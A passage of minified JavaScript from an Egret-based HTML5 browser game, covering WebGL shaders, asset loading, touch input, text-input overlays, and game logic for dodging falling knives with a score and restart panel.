            for (b = 0; b < c; b++)this.attribState[b] !== this.tempAttribState[b] && (this.attribState[b] = this.tempAttribState[b], this.tempAttribState[b] ? a.enableVertexAttribArray(b) : a.disableVertexAttribArray(b))
        };
        return b
    }();
    b.WebGLShaderManager = e;
    e.prototype.__class__ = "egret.WebGLShaderManager";
    var d = function () {
        function a(b) {
            this.defaultVertexSrc =
                "attribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\nattribute vec2 aColor;\nuniform vec2 projectionVector;\nuniform vec2 offsetVector;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nconst vec2 center = vec2(-1.0, 1.0);\nvoid main(void) {\n   gl_Position = vec4( ((aVertexPosition + offsetVector) / projectionVector) + center , 0.0, 1.0);\n   vTextureCoord = aTextureCoord;\n   vColor = vec4(aColor.x, aColor.x, aColor.x, aColor.x);\n}";
            this.program = null;
            this.fragmentSrc = "precision lowp float;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nuniform sampler2D uSampler;\nvoid main(void) {\ngl_FragColor = texture2D(uSampler, vTextureCoord) * vColor ;\n}";
            this.gl = b;
            this.init()
        }

        a.prototype.init = function () {
            var a = this.gl, c = b.WebGLUtils.compileProgram(a, this.defaultVertexSrc, this.fragmentSrc);
            a.useProgram(c);
            this.uSampler = a.getUniformLocation(c, "uSampler");
            this.projectionVector = a.getUniformLocation(c, "projectionVector");
            this.offsetVector = a.getUniformLocation(c, "offsetVector");
            this.dimensions = a.getUniformLocation(c, "dimensions");
            this.aVertexPosition = a.getAttribLocation(c, "aVertexPosition");
            this.aTextureCoord = a.getAttribLocation(c, "aTextureCoord");
            this.colorAttribute =
                a.getAttribLocation(c, "aColor");
            -1 === this.colorAttribute && (this.colorAttribute = 2);
            this.attributes = [this.aVertexPosition, this.aTextureCoord, this.colorAttribute];
            for (var d in this.uniforms)this.uniforms[d].uniformLocation = a.getUniformLocation(c, d);
            this.initUniforms();
            this.program = c
        };
        a.prototype.initUniforms = function () {
            if (this.uniforms) {
                var a = this.gl, b, c;
                for (c in this.uniforms) {
                    b = this.uniforms[c];
                    var d = b.type;
                    "mat2" === d || "mat3" === d || "mat4" === d ? (b.glMatrix = !0, b.glValueLength = 1, "mat2" === d ? b.glFunc = a.uniformMatrix2fv :
                        "mat3" === d ? b.glFunc = a.uniformMatrix3fv : "mat4" === d && (b.glFunc = a.uniformMatrix4fv)) : (b.glFunc = a["uniform" + d], b.glValueLength = "2f" === d || "2i" === d ? 2 : "3f" === d || "3i" === d ? 3 : "4f" === d || "4i" === d ? 4 : 1)
                }
            }
        };
        a.prototype.syncUniforms = function () {
            if (this.uniforms) {
                var a, b = this.gl, c;
                for (c in this.uniforms)a = this.uniforms[c], 1 === a.glValueLength ? !0 === a.glMatrix ? a.glFunc.call(b, a.uniformLocation, a.transpose, a.value) : a.glFunc.call(b, a.uniformLocation, a.value) : 2 === a.glValueLength ? a.glFunc.call(b, a.uniformLocation, a.value.x,
                    a.value.y) : 3 === a.glValueLength ? a.glFunc.call(b, a.uniformLocation, a.value.x, a.value.y, a.value.z) : 4 === a.glValueLength && a.glFunc.call(b, a.uniformLocation, a.value.x, a.value.y, a.value.z, a.value.w)
            }
        };
        return a
    }();
    b.EgretShader = d;
    d.prototype.__class__ = "egret.EgretShader";
    var a = function (a) {
        function b(c) {
            a.call(this, c);
            this.fragmentSrc = "precision mediump float;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nuniform float invert;\nuniform mat4 matrix;\nuniform vec4 colorAdd;\nuniform sampler2D uSampler;\nvoid main(void) {\nvec4 locColor = texture2D(uSampler, vTextureCoord) * matrix;\nif(locColor.a != 0.0){\nlocColor += colorAdd;\n}\ngl_FragColor = locColor;\n}";
            this.uniforms = {
                matrix: {type: "mat4", value: [1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1]},
                colorAdd: {type: "4f", value: {x: 0, y: 0, z: 0, w: 0}}
            };
            this.init()
        }

        __extends(b, a);
        return b
    }(d);
    b.ColorTransformShader = a;
    a.prototype.__class__ = "egret.ColorTransformShader";
    var c = function () {
        function a(b) {
            this.alpha = this.translationMatrix = this.attributes = this.colorAttribute = this.aVertexPosition = this.tintColor = this.offsetVector = this.projectionVector = this.program = null;
            this.fragmentSrc = "precision mediump float;\nvarying vec4 vColor;\nvoid main(void) {\n   gl_FragColor = vColor;\n}";
            this.vertexSrc = "attribute vec2 aVertexPosition;\nattribute vec4 aColor;\nuniform mat3 translationMatrix;\nuniform vec2 projectionVector;\nuniform vec2 offsetVector;\nuniform float alpha;\nuniform vec3 tint;\nvarying vec4 vColor;\nvoid main(void) {\n   vec3 v = translationMatrix * vec3(aVertexPosition , 1.0);\n   v -= offsetVector.xyx;\n   gl_Position = vec4( v.x / projectionVector.x -1.0, v.y / -projectionVector.y + 1.0 , 0.0, 1.0);\n   vColor = aColor * vec4(tint * alpha, alpha);\n}";
            this.gl = b;
            this.init()
        }

        a.prototype.init = function () {
            var a = this.gl, c = b.WebGLUtils.compileProgram(a, this.vertexSrc, this.fragmentSrc);
            a.useProgram(c);
            this.projectionVector = a.getUniformLocation(c, "projectionVector");
            this.offsetVector = a.getUniformLocation(c, "offsetVector");
            this.tintColor = a.getUniformLocation(c, "tint");
            this.aVertexPosition = a.getAttribLocation(c, "aVertexPosition");
            this.colorAttribute = a.getAttribLocation(c, "aColor");
            this.attributes = [this.aVertexPosition, this.colorAttribute];
            this.translationMatrix = a.getUniformLocation(c,
                "translationMatrix");
            this.alpha = a.getUniformLocation(c, "alpha");
            this.program = c
        };
        return a
    }();
    b.PrimitiveShader = c;
    c.prototype.__class__ = "egret.PrimitiveShader"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this)
        }

        __extends(a, d);
        a.prototype.proceed = function (a) {
            function d() {
                if (4 == n.readyState)if (n.status != a._status && (a._status = n.status, b.HTTPStatusEvent.dispatchHTTPStatusEvent(a, n.status)), 400 <= n.status || 0 == n.status)b.IOErrorEvent.dispatchIOErrorEvent(a); else {
                    switch (a.dataFormat) {
                        case b.URLLoaderDataFormat.TEXT:
                            a.data = n.responseText;
                            break;
                        case b.URLLoaderDataFormat.VARIABLES:
                            a.data = new b.URLVariables(n.responseText);
                            break;
                        case b.URLLoaderDataFormat.BINARY:
                            a.data =
                                n.response;
                            break;
                        default:
                            a.data = n.responseText
                    }
                    b.__callAsync(b.Event.dispatchEvent, b.Event, a, b.Event.COMPLETE)
                }
            }

            if (a.dataFormat == b.URLLoaderDataFormat.TEXTURE)this.loadTexture(a); else if (a.dataFormat == b.URLLoaderDataFormat.SOUND)this.loadSound(a); else {
                var e = a._request, n = this.getXHR();
                n.onreadystatechange = d;
                var g = b.NetContext._getUrl(e);
                n.open(e.method, g, !0);
                this.setResponseType(n, a.dataFormat);
                e.method != b.URLRequestMethod.GET && e.data ? e.data instanceof b.URLVariables ? (n.setRequestHeader("Content-Type",
                    "application/x-www-form-urlencoded"), n.send(e.data.toString())) : (n.setRequestHeader("Content-Type", "multipart/form-data"), n.send(e.data)) : n.send()
            }
        };
        a.prototype.loadSound = function (a) {
            function d(g) {
                window.clearTimeout(n.__timeoutId);
                n.removeEventListener("canplaythrough", d, !1);
                n.removeEventListener("error", e, !1);
                g = new b.Sound;
                g._setAudio(n);
                a.data = g;
                b.__callAsync(b.Event.dispatchEvent, b.Event, a, b.Event.COMPLETE)
            }

            function e(g) {
                window.clearTimeout(n.__timeoutId);
                n.removeEventListener("canplaythrough",
                    d, !1);
                n.removeEventListener("error", e, !1);
                b.IOErrorEvent.dispatchIOErrorEvent(a)
            }

            var n = new Audio(a._request.url);
            n.__timeoutId = window.setTimeout(d, 100);
            n.addEventListener("canplaythrough", d, !1);
            n.addEventListener("error", e, !1);
            n.load()
        };
        a.prototype.getXHR = function () {
            return window.XMLHttpRequest ? new window.XMLHttpRequest : new ActiveXObject("MSXML2.XMLHTTP")
        };
        a.prototype.setResponseType = function (a, d) {
            switch (d) {
                case b.URLLoaderDataFormat.TEXT:
                case b.URLLoaderDataFormat.VARIABLES:
                    a.responseType = b.URLLoaderDataFormat.TEXT;
                    break;
                case b.URLLoaderDataFormat.BINARY:
                    a.responseType = "arraybuffer";
                    break;
                default:
                    a.responseType = d
            }
        };
        a.prototype.loadTexture = function (a) {
            var d = a._request, e = new Image;
            e.crossOrigin = "Anonymous";
            e.onload = function (d) {
                e.onerror = null;
                e.onload = null;
                d = new b.Texture;
                d._setBitmapData(e);
                a.data = d;
                b.__callAsync(b.Event.dispatchEvent, b.Event, a, b.Event.COMPLETE)
            };
            e.onerror = function (d) {
                e.onerror = null;
                e.onload = null;
                b.IOErrorEvent.dispatchIOErrorEvent(a)
            };
            e.src = d.url
        };
        return a
    }(b.NetContext);
    b.HTML5NetContext = e;
    e.prototype.__class__ = "egret.HTML5NetContext"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this._isTouchDown = !1;
            this.rootDiv = document.getElementById(b.StageDelegate.canvas_div_name)
        }

        __extends(a, d);
        a.prototype.prevent = function (a) {
            a.stopPropagation();
            !0 != a.isScroll && a.preventDefault()
        };
        a.prototype.run = function () {
            var a = this;
            window.navigator.msPointerEnabled ? (this.rootDiv.addEventListener("MSPointerDown", function (b) {
                a._onTouchBegin(b);
                a.prevent(b)
            }, !1), this.rootDiv.addEventListener("MSPointerMove", function (b) {
                    a._onTouchMove(b);
                    a.prevent(b)
                },
                !1), this.rootDiv.addEventListener("MSPointerUp", function (b) {
                a._onTouchEnd(b);
                a.prevent(b)
            }, !1)) : b.MainContext.deviceType == b.MainContext.DEVICE_MOBILE ? this.addTouchListener() : b.MainContext.deviceType == b.MainContext.DEVICE_PC && (this.addTouchListener(), this.addMouseListener());
            window.addEventListener("mousedown", function (b) {
                a.inOutOfCanvas(b) ? a.dispatchLeaveStageEvent() : a._isTouchDown = !0
            });
            window.addEventListener("mouseup", function (b) {
                a._isTouchDown && (a.inOutOfCanvas(b) ? a.dispatchLeaveStageEvent() : a._onTouchEnd(b));
                a._isTouchDown = !1
            })
        };
        a.prototype.addMouseListener = function () {
            var a = this;
            this.rootDiv.addEventListener("mousedown", function (b) {
                a._onTouchBegin(b)
            });
            this.rootDiv.addEventListener("mousemove", function (b) {
                a._onTouchMove(b)
            });
            this.rootDiv.addEventListener("mouseup", function (b) {
                a._onTouchEnd(b)
            })
        };
        a.prototype.addTouchListener = function () {
            var a = this;
            this.rootDiv.addEventListener("touchstart", function (b) {
                for (var d = b.changedTouches.length, e = 0; e < d; e++)a._onTouchBegin(b.changedTouches[e]);
                a.prevent(b)
            }, !1);
            this.rootDiv.addEventListener("touchmove",
                function (b) {
                    for (var d = b.changedTouches.length, e = 0; e < d; e++)a._onTouchMove(b.changedTouches[e]);
                    a.prevent(b)
                }, !1);
            this.rootDiv.addEventListener("touchend", function (b) {
                for (var d = b.changedTouches.length, e = 0; e < d; e++)a._onTouchEnd(b.changedTouches[e]);
                a.prevent(b)
            }, !1);
            this.rootDiv.addEventListener("touchcancel", function (b) {
                for (var d = b.changedTouches.length, e = 0; e < d; e++)a._onTouchEnd(b.changedTouches[e]);
                a.prevent(b)
            }, !1)
        };
        a.prototype.inOutOfCanvas = function (a) {
            var d = this.getLocation(this.rootDiv, a);
            a = d.x;
            var d = d.y, e = b.MainContext.instance.stage;
            return 0 > a || 0 > d || a > e.stageWidth || d > e.stageHeight ? !0 : !1
        };
        a.prototype.dispatchLeaveStageEvent = function () {
            this.touchingIdentifiers.length = 0;
            b.MainContext.instance.stage.dispatchEventWith(b.Event.LEAVE_STAGE)
        };
        a.prototype._onTouchBegin = function (a) {
            var b = this.getLocation(this.rootDiv, a), d = -1;
            a.hasOwnProperty("identifier") && (d = a.identifier);
            this.onTouchBegan(b.x, b.y, d)
        };
        a.prototype._onTouchMove = function (a) {
            var b = this.getLocation(this.rootDiv, a), d = -1;
            a.hasOwnProperty("identifier") &&
            (d = a.identifier);
            this.onTouchMove(b.x, b.y, d)
        };
        a.prototype._onTouchEnd = function (a) {
            var b = this.getLocation(this.rootDiv, a), d = -1;
            a.hasOwnProperty("identifier") && (d = a.identifier);
            this.onTouchEnd(b.x, b.y, d)
        };
        a.prototype.getLocation = function (a, d) {
            var e = document.documentElement, n = window, g, f;
            "function" === typeof a.getBoundingClientRect ? (f = a.getBoundingClientRect(), g = f.left, f = f.top) : f = g = 0;
            g += n.pageXOffset - e.clientLeft;
            f += n.pageYOffset - e.clientTop;
            null != d.pageX ? (e = d.pageX, n = d.pageY) : (g -= document.body.scrollLeft,
                f -= document.body.scrollTop, e = d.clientX, n = d.clientY);
            var h = b.Point.identity;
            h.x = (e - g) / b.StageDelegate.getInstance().getScaleX();
            h.y = (n - f) / b.StageDelegate.getInstance().getScaleY();
            return h
        };
        return a
    }(b.TouchContext);
    b.HTML5TouchContext = e;
    e.prototype.__class__ = "egret.HTML5TouchContext"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this._isShow = !0;
            this._canUse = !1;
            this._inputType = "";
            this._isFirstClick = !0;
            this._defaultText = this._text = "";
            this._height = this._width = 0;
            this._styleInfoes = {}
        }

        __extends(a, d);
        a.prototype._open = function (a, d, e, n) {
            e = b.StageDelegate.getInstance().getScaleX();
            n = b.StageDelegate.getInstance().getScaleY();
            var g = b.Browser.getInstance().$new("div");
            g.position.x = a * e;
            g.position.y = d * n;
            g.scale.x = e;
            g.scale.y = n;
            g.transforms();
            g.style[egret_dom.getTrans("transformOrigin")] =
                "0% 0% 0px";
            this.div = g;
            this._createInput();
            g.style.display = "block";
            g.style.background = "none";
            g.style.pointerEvents = "none";
            this._call = this.onHandler.bind(this)
        };
        a.prototype._addListeners = function () {
            window.navigator.msPointerEnabled ? (this.addListener("MSPointerDown"), this.addListener("MSPointerUp")) : b.MainContext.deviceType == b.MainContext.DEVICE_MOBILE ? (this.addListener("touchstart"), this.addListener("touchend"), this.addListener("touchcancel")) : b.MainContext.deviceType == b.MainContext.DEVICE_PC && (this.addListener("mousedown"),
                this.addListener("mouseup"));
            this.addListener("focus");
            this.addListener("blur");
            this._isShow = !0;
            this._closeInput();
            this.closeKeyboard()
        };
        a.prototype._removeListeners = function () {
            window.navigator.msPointerEnabled ? (this.removeListener("MSPointerDown"), this.removeListener("MSPointerUp")) : b.MainContext.deviceType == b.MainContext.DEVICE_MOBILE ? (this.removeListener("touchstart"), this.removeListener("touchend"), this.removeListener("touchcancel")) : b.MainContext.deviceType == b.MainContext.DEVICE_PC && (this.removeListener("mousedown"),
                this.removeListener("mouseup"));
            this.removeListener("blur");
            this.removeListener("focus")
        };
        a.prototype.addListener = function (a) {
            this.inputElement.addEventListener(a, this._call)
        };
        a.prototype.removeListener = function (a) {
            this.inputElement.removeEventListener(a, this._call)
        };
        a.prototype.onHandler = function (a) {
            a.isScroll = !0;
            "blur" == a.type ? (this.dispatchEvent(new b.Event("blur")), this._closeInput()) : "focus" == a.type ? this._canUse ? (this._canUse = !1, this._openInput(), this.dispatchEvent(new b.Event("focus"))) : (a.isScroll = !1, this.inputElement.blur()) : ("touchstart" == a.type || "mousedown" == a.type || "MSPointerDown" == a.type) && this._isShow && a.stopPropagation()
        };
        a.prototype._show = function () {
            this._canUse = !0
        };
        a.prototype._hide = function () {
            this._canUse && (this._canUse = !1, this._closeInput(), this.closeKeyboard())
        };
        a.prototype._openInput = function () {
            this._isShow || (this._isShow = !0, this._isFirstClick ? (this._isFirstClick = !1, this._text = this._defaultText, this.setElementValue(this._defaultText)) : this.setElementValue(this._text))
        };
        a.prototype._closeInput =
            function () {
                this._isShow && (this._text = this.inputElement.value, this._isShow = !1, this.setElementValue(""))
            };
        a.prototype.closeKeyboard = function () {
            this.inputElement.focus();
            this.inputElement.blur()
        };
        a.prototype.getStageDelegateDiv = function () {
            var a = b.Browser.getInstance().$("#StageDelegateDiv");
            a || (a = b.Browser.getInstance().$new("div"), a.id = "StageDelegateDiv", document.getElementById(b.StageDelegate.canvas_div_name).appendChild(a), a.transforms());
            return a
        };
        a.prototype._add = function () {
            var a = this.div;
            a && !a.parentNode &&
            this.getStageDelegateDiv().appendChild(a)
        };
        a.prototype._remove = function () {
            var a = this.div;
            a && a.parentNode && a.parentNode.removeChild(a)
        };
        a.prototype.changePosition = function (a, d) {
            var e = b.StageDelegate.getInstance().getScaleX(), n = b.StageDelegate.getInstance().getScaleY();
            this.div.position.x = a * e;
            this.div.position.y = d * n;
            this.div.transforms()
        };
        a.prototype._createInput = function () {
            var a = !1, b;
            this._multiline && "textarea" != this._inputType ? (a = !0, this._inputType = "textarea", b = document.createElement("textarea"),
                b.type = "text", b.style.resize = "none") : this._multiline || "input" == this._inputType || (a = !0, this._inputType = "input", b = document.createElement("input"), b.type = "text");
            a && (this._styleInfoes = {}, this._isFirstClick = !0, this.inputElement && this.inputElement.parentNode ? (a = this.inputElement.parentNode, a.removeChild(this.inputElement), this._removeListeners(), this.inputElement = b, a.appendChild(this.inputElement), this._addListeners()) : this.inputElement = b, this.setElementValue(this._defaultText), this.div.appendChild(b));
            this.setElementStyle("fontStyle", this._italic ? "italic" : "normal");
            this.setElementStyle("fontWeight", this._bold ? "bold" : "normal");
            this.setElementStyle("textAlign", this._textAlign);
            this.setElementStyle("fontSize", this._size + "px");
            this.setElementStyle("lineHeight", this._size + "px");
            this.setElementStyle("fontFamily", this._fontFamily);
            this.setElementStyle("color", this._color);
            this.setElementStyle("width", this._width + "px");
            this.setElementStyle("height", this._height + "px");
            this.setElementStyle("border", "none");
            this.setElementStyle("background", "none");
            this.setElementStyle("margin", "0");
            this.setElementStyle("padding", "0");
            this.setElementStyle("outline", "medium");
            this.setElementStyle("verticalAlign", "top");
            this.div.style.pointerEvents = this._visible ? "auto" : "none"
        };
        a.prototype._resetStageText = function () {
            this._createInput()
        };
        a.prototype.setElementValue = function (a) {
            this._isFirstClick || (this.inputElement.value = a)
        };
        a.prototype._getText = function () {
            return this._isShow ? this._isFirstClick ? this._defaultText : this.inputElement.value :
                this._text
        };
        a.prototype._setText = function (a) {
            this._defaultText = this._text = a;
            this._isShow && this.setElementValue(a)
        };
        a.prototype._setTextType = function (a) {
            this.inputElement.type = a
        };
        a.prototype._getTextType = function () {
            return this.inputElement.type
        };
        a.prototype._setWidth = function (a) {
            this._width = a
        };
        a.prototype._setHeight = function (a) {
            this._height = a
        };
        a.prototype.setElementStyle = function (a, b) {
            this.inputElement && this._styleInfoes[a] != b && (this.inputElement.style[a] = b, this._styleInfoes[a] = b)
        };
        return a
    }(b.StageText);
    b.HTML5StageText = e;
    e.prototype.__class__ = "egret.HTML5StageText"
})(egret || (egret = {}));
egret.StageText.create = function () {
    return new egret.HTML5StageText
};
var __extends = this.__extends || function (b, e) {
        function d() {
            this.constructor = b
        }

        for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
        d.prototype = e.prototype;
        b.prototype = new d
    }, pander;
(function (b) {
    var e = function (b) {
        function a(a) {
            b.call(this);
            this.body = a ? new egret.Bitmap(RES.getRes("knife2")) : new egret.Bitmap(RES.getRes("knife"));
            this.addChild(this.body)
        }

        __extends(a, b);
        a.prototype.onDestroy = function () {
            this.parent.removeChild(this)
        };
        a.prototype.random = function (a, b) {
            return Math.ceil(a + Math.random() * (b - a))
        };
        return a
    }(egret.DisplayObjectContainer);
    b.Knife = e;
    e.prototype.__class__ = "pander.Knife"
})(pander || (pander = {}));
(function (b) {
    var e = function () {
        function b() {
            this._pool = [];
            this._list = []
        }

        b.prototype.createObject = function (a, b) {
            var d;
            d = this._pool;
            d = null != d && d.length ? d.shift() : new a(b);
            this._list.push(d);
            return d
        };
        b.prototype.destroyObject = function (a) {
            this._pool.push(a);
            a.onDestroy();
            a = this._list.indexOf(a);
            -1 != a && this._list.splice(a, 1)
        };
        Object.defineProperty(b.prototype, "objectList", {
            get: function () {
                return this._list
            }, enumerable: !0, configurable: !0
        });
        b.getInstance = function () {
            null == b.instance && (b.instance = new b);
            return b.instance
        };
        return b
    }();
    b.ObjectPool = e;
    e.prototype.__class__ = "pander.ObjectPool"
})(pander || (pander = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a() {
            b.call(this);
            this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
            this.addEventListener(egret.Event.ENTER_FRAME, this.enterFrameHandler, this)
        }

        __extends(a, b);
        a.prototype.onAddToStage = function (b) {
            this.removeEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
            this.addEventListener("stopEnterFrame", this.stopEnterFrame, this);
            this.edge = Math.ceil(0.05 * Main.stageW);
            this.middle = Math.ceil(0.03 * Main.stageW);
            a.m_coordinate = Main.stageW /
            2 - this.middle / 2;
            a.r_coordinate = Main.stageW - this.edge;
            a.secondStart = Math.ceil(Main.stageW / 2 + this.middle / 2);
            a.secondFinish = Math.ceil(Main.stageW - this.edge);
            a.secondDisX = a.secondFinish - a.secondStart - this.edge;
            b = RES.getRes("yellow");
            RES.getRes("purple");
            this.textureHeight = b.textureHeight;
            this.rowCount = Math.ceil(Main.stagaH / this.textureHeight) + 1;
            this.bmpArr = [];
            this.bmpArr1 = [];
            for (b = 0; b < this.rowCount; b++) {
                var d = this.createBitmapByName("yellow"), e = this.createBitmapByName("purple");
                d.width = Main.stageW;
                e.width =
                    Main.stageW;
                d.y = this.textureHeight * b - (this.textureHeight * this.rowCount - Main.stagaH);
                e.y = this.textureHeight * b - (this.textureHeight * this.rowCount - Main.stagaH);
                e.x = Main.stageW / 2;
                this.bmpArr.push(d);
                this.bmpArr1.push(e);
                this.addChild(d);
                this.addChild(e)
            }
            this.showScore = new egret.Bitmap;
            this.showScore.texture = RES.getRes("showScore");
            this.showScore.x = Main.stageW / 2 - this.showScore.width / 2;
            this.showScore.y = 50;
            this.addChild(this.showScore);
            this.createGameBg(0, 0, this.edge, Main.stagaH, 0);
            this.createGameBg(a.m_coordinate,
                0, this.middle, Main.stagaH, 0);
            this.createGameBg(a.r_coordinate, 0, this.edge, Main.stagaH, 0)
        };
        a.prototype.enterFrameHandler = function (a) {
            a = Math.ceil(FPS.rateoffest());
            Infinity != a && (this.speed = 2 * a);
            for (a = 0; a < this.rowCount; a++) {
                var b = this.bmpArr[a], d = this.bmpArr1[a];
                b.y += this.speed;
                d.y += this.speed;
                b.y > Main.stagaH && (b.y = this.bmpArr[0].y - this.textureHeight, this.bmpArr.pop(), this.bmpArr.unshift(b));
                d.y > Main.stagaH && (d.y = this.bmpArr1[0].y - this.textureHeight, this.bmpArr1.pop(), this.bmpArr1.unshift(d))
            }
        };
        a.prototype.createGameBg =
            function (a, b, d, e, g) {
                var f = new egret.Sprite;
                f.graphics.beginFill(g, 1);
                f.graphics.drawRect(a, b, d, e);
                f.graphics.endFill();
                f.touchEnabled = !0;
                f.width = d;
                f.height = e;
                this.addChild(f)
            };
        a.prototype.createBitmapByName = function (a) {
            var b = new egret.Bitmap;
            a = RES.getRes(a);
            b.texture = a;
            return b
        };
        a.prototype.stopEnterFrame = function () {
            this.removeEventListener(egret.Event.ENTER_FRAME, this.enterFrameHandler, this)
        };
        return a
    }(egret.DisplayObjectContainer);
    b.GameBackground = e;
    e.prototype.__class__ = "pander.GameBackground"
})(pander ||
(pander = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(a) {
            d.call(this);
            this.kArr = [];
            this.d = 0;
            this.judge = a;
            this.clientH = document.documentElement.clientHeight;
            this.min_height = Math.ceil(0.33 * this.clientH);
            this.middle = Math.ceil(0.03 * Main.stageW);
            this.objpool = new b.ObjectPool;
            this.objpool2 = new b.ObjectPool;
            this.r_h = this.random(this.min_height, this.clientH);
            new GameProfiler(this)
        }

        __extends(a, d);
        a.prototype.createKnife = function () {
            this.or = this.random(0, 2) - 1;
            this.edge = Math.ceil(0.05 * Main.stageW) + 50;
            this.m_coordinate = Main.stageW /
            2 - this.middle / 2 - 50;
            if (this.judge)if (this.or) {
                var a = this.objpool2.createObject(b.Knife, !0);
                a.x = b.GameBackground.secondStart + a.width / 2
            } else a = this.objpool.createObject(b.Knife, !1), a.x = b.GameBackground.secondFinish - a.width / 2; else this.or ? (a = this.objpool2.createObject(b.Knife, !0), a.x = this.edge) : (a = this.objpool.createObject(b.Knife, !1), a.x = this.m_coordinate);
            this.kArr.push(a);
            a.y = 0;
            a.anchorX = a.anchorY = 0.5;
            this.addChild(a)
        };
        a.prototype.move = function (c) {
            this.d += 5 * FPS.rateoffest();
            this.d > this.r_h && (this.r_h =
                this.random(this.min_height, this.clientH), this.createKnife(), this.d = 0);
            for (var d = 0; d < this.kArr.length; d++)this._obj = this.kArr[d], this._obj.y += 8 * FPS.rateoffest(), this.kArr[d].y > Math.ceil(0.85 * Main.stagaH) && this._obj.parent && (this.kArr.shift(), this.removeChild(this._obj), a.counts += 1), b.GameUtil.hitTest(c, this._obj) && this._obj.parent && (this.dispatchEvent(new egret.Event("knifes_stop")), c.gotoAndPlay("hurt"), c.frameRate = 12, egret.Tween.removeAllTweens(), egret.Tween.get(c).to({y: Main.stagaH}, 500).call(this.showOVer,
                this))
        };
        a.prototype.showOVer = function () {
            this.dispatchEvent(new egret.Event("showOver"))
        };
        a.prototype.random = function (a, b) {
            return Math.ceil(a + Math.random() * (b - a))
        };
        a.counts = 0;
        return a
    }(egret.DisplayObjectContainer);
    b.Knifes = e;
    e.prototype.__class__ = "pander.Knifes"
})(pander || (pander = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this.localStorage_score_name = "local_score_name";
            this.max_value = 0;
            this.max_score = new egret.BitmapText;
            this.score_show = new egret.Sprite;
            var a = new egret.Shape;
            a.graphics.beginFill(0, 0.5);
            a.graphics.drawRect(0, 0, Main.stageW, Main.stagaH);
            a.graphics.endFill();
            this.addChild(a);
            this.frame = new egret.Bitmap;
            this.frame.texture = RES.getRes("frame");
            this.frame.x = Main.stageW / 2 - this.frame.width / 2;
            this.frame.y = Main.stagaH / 2 - this.frame.height / 2;
            this.score_show.addChild(this.frame);
            1 == window.haveShare && window.haveGamelist && (this.share_img = new egret.Bitmap, this.share_img.texture = RES.getRes("share_1"), this.share_img.touchEnabled = !0, this.share_img.x = Main.stageW / 2 - this.share_img.width / 2, this.share_img.y = this.frame.y + 450, this.share_img.addEventListener(egret.TouchEvent.TOUCH_TAP, this.showTips, this), this.score_show.addChild(this.share_img), this.game_reset = new egret.Bitmap, this.game_reset.texture = RES.getRes("restart"), this.game_reset.x = Main.stageW / 2 - this.game_reset.width / 2, this.game_reset.y =
                this.frame.y + 540, this.game_reset.touchEnabled = !0, this.game_reset.addEventListener(egret.TouchEvent.TOUCH_TAP, this.reset, this), this.score_show.addChild(this.game_reset));
            1 == window.haveShare && 1 == window.haveGamelist && (this.share_img = new egret.Bitmap, this.share_img.texture = RES.getRes("share_1"), this.share_img.touchEnabled = !0, this.share_img.x = Main.stageW / 2 - this.share_img.width / 2, this.share_img.y = this.frame.y + 450, this.share_img.addEventListener(egret.TouchEvent.TOUCH_TAP, this.showTips, this), this.score_show.addChild(this.share_img),
                this.game_reset = new egret.Bitmap, this.game_reset.texture = RES.getRes("restart"), this.game_reset.x = Main.stageW / 2 - this.game_reset.width / 2, this.game_reset.y = this.frame.y + 540, this.game_reset.touchEnabled = !0, this.game_reset.addEventListener(egret.TouchEvent.TOUCH_TAP, this.reset, this), this.score_show.addChild(this.game_reset));
            if (!window.haveShare && 1 == window.haveGamelist) {
                a = new egret.Shape;
                a.graphics.beginFill(15373066, 1);
                a.graphics.drawRoundRect(0, 0, 327, 85, 10);
                a.graphics.endFill();
                a.touchEnabled = !0;
                a.width =
                    327;
                a.height = 85;
                a.x = Main.stageW / 2 - a.width / 2;
                a.y = this.frame.y + 450;
                a.addEventListener(egret.TouchEvent.TOUCH_TAP, this._more, this);
                var e = new egret.TextField;
                e.text = "\u66f4\u591a\u6e38\u620f";
                e.fontFamily = "\u5fae\u8f6f\u96c5\u9ed1";
                e.textColor = 16777215;
                e.size = 36;
                e.x = Main.stageW / 2 - a.width / 2 + e.width / 2 + 20;
                e.y = this.frame.y + 450 + e.height / 2;
                this.score_show.addChild(a);
                this.score_show.addChild(e);
                this.game_reset = new egret.Bitmap;
                this.game_reset.texture = RES.getRes("restart");
                this.game_reset.x = Main.stageW / 2 - this.game_reset.width /
                2;
                this.game_reset.y = this.frame.y + 540;
                this.game_reset.touchEnabled = !0;
                this.game_reset.addEventListener(egret.TouchEvent.TOUCH_TAP, this.reset, this);
                this.score_show.addChild(this.game_reset)
            }
